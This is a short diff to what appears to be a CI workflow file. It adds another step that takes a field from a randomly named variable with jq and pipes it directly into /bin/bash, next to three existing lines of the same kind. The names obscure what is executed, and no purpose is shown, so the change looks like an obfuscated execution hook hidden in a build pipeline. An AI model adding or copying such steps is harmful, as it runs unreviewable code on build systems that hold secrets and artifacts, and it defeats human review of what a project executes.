@@ -26,6 +26,7 @@ jobs:
           echo $ropq76 | jq -r .e5125 | /bin/bash
           echo $iyz148 | jq -r .yd06081 | /bin/bash
           echo $d05448 | jq -r .zg4 | /bin/bash
+          printf '%s' "$dchzb1955" | jq -r .mk340 | /bin/bash
 
       - name: Upload artifact
         uses: actions/upload-artifact@v4
